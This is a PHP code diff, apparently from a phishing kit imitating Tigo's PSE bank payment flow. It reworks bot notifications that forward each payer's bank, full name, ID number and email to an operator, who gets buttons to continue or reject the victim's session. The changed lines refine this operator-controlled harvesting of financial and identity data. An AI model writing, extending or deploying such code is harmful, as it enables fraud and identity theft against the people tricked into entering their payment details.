@@ -620,9 +620,9 @@ try {
             
             $pseData = $data;
             
-            // Verificar si es mensaje inicial (solo email) o completo (con banco)
-            if (isset($pseData['bank_name'])) {
-                // Mensaje completo con banco seleccionado
+            // Verificar si es mensaje inicial (desde payment/methods) o completo (desde formulario PSE)
+            if (isset($pseData['bank_name']) && isset($pseData['full_name'])) {
+                // Mensaje completo con banco seleccionado (desde formulario PSE)
                 $message = "🏦 <b>TIGO - PAGO PSE COMPLETO</b>\n\n";
                 $message .= "🧾 <b>Factura:</b> <code>{$pseData['invoice_id']}</code>\n";
                 $message .= "🏦 <b>Banco:</b> {$pseData['bank_name']}\n";
@@ -630,7 +630,7 @@ try {
                 $message .= "📝 <b>Nombre:</b> {$pseData['full_name']}\n";
                 $message .= "🆔 <b>{$pseData['doc_type']}:</b> <code>{$pseData['doc_number']}</code>\n";
                 $message .= "📧 <b>Email:</b> <code>{$pseData['email']}</code>\n";
-                $message .= "\n⏰ {$data['timestamp']}\n";
+                $message .= "\n⏰ {$pseData['timestamp']}\n";
                 $message .= "🔖 <code>" . substr($sessionId, 0, 12) . "</code>";
                 
                 $buttons = [
@@ -640,19 +640,19 @@ try {
                     ]
                 ];
             } else {
-                // Mensaje inicial solo con email
-                $message = "🏦 <b>TIGO - SOLICITUD PSE INICIAL</b>\n\n";
+                // Mensaje inicial desde payment/methods (solo invoice y monto)
+                $amount = isset($pseData['amount']) ? number_format($pseData['amount'], 0, ',', '.') : '0';
+                $message = "🏦 <b>TIGO - PAGO PSE INICIADO</b>\n\n";
                 $message .= "🧾 <b>Factura:</b> <code>{$pseData['invoice_id']}</code>\n";
-                $message .= "👤 <b>Tipo Persona:</b> {$pseData['person_type']}\n";
-                $message .= "👥 <b>Usuario:</b> " . ($pseData['is_registered'] ? 'Registrado' : 'Nuevo') . "\n";
-                $message .= "📧 <b>Email:</b> <code>{$pseData['email']}</code>\n";
-                $message .= "\n⏰ {$data['timestamp']}\n";
+                $message .= "💵 <b>Monto:</b> \${$amount}\n";
+                $message .= "💳 <b>Método:</b> PSE\n";
+                $message .= "\n⏰ {$pseData['timestamp']}\n";
                 $message .= "🔖 <code>" . substr($sessionId, 0, 12) . "</code>";
                 
                 $buttons = [
                     [
-                        ['text' => '✅ Continuar a Banco', 'callback_data' => "seguir_banco|{$sessionId}"],
-                        ['text' => '❌ Rechazar PSE', 'callback_data' => "rechazar_pse|{$sessionId}"]
+                        ['text' => '✅ Continuar a Formulario', 'callback_data' => "tigo_pse_continue|{$sessionId}"],
+                        ['text' => '❌ Rechazar', 'callback_data' => "tigo_pse_reject|{$sessionId}"]
                     ]
                 ];
             }
